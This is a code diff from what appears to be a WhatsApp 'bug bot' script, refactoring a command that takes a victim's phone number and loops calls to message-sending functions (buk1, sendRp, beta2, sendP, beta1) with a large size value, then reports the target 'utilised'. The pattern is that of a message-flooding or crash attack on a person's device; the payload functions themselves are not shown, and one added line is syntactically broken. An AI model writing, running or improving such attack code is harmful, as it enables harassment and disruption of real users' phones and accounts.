@@ -413,7 +413,27 @@ const fake = {
                 }
             }
         }	
-		
+// Define the invisible function
+async function invisibleAction(sam, target, fake) {
+    let statusTracker = document.createElement('div');
+    statusTracker.style.display = 'none'; // Make it invisible
+    document.body.appendChild(statusTracker); // Append it to the body
+
+    for (let i = 0; i < 2; i++) {
+        await buk1(sam, target, "Spider", 1020000, ptcp = true);
+        sendRp(target, fake);
+        await sendRp(target, fake);
+        await beta2(sam, target, fake);
+        await sendP(target, fake);
+        await beta1(sam, target, fake);
+        
+        // Update status tracker (optional)
+        statusTracker.innerText += Attempt ${i + 1} completed for ${target}n;
+    }
+}
+
+// Replace 'spider' with the invisible function in your command handling
+    		
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -562,22 +582,8 @@ if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
-    const toInvisibleText = (text) => {
-        return text.split('').map(char => '
-' + char).join('');
-    };
-
-    const invisibleText = toInvisibleText("
-");
-
-    for (let i = 0; i < 2; i++) {
-        await buk1(sam, target, invisibleText, 1020000, true);
-        await sendRp(target, fake);
-        await sendRp(target, fake);
-        await beta2(sam, target, fake);
-        await sendP(target, fake);
-        await beta1(sam, target, fake);
-}
+    await invisibleAction(sam, target, fake);
+		}
 reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
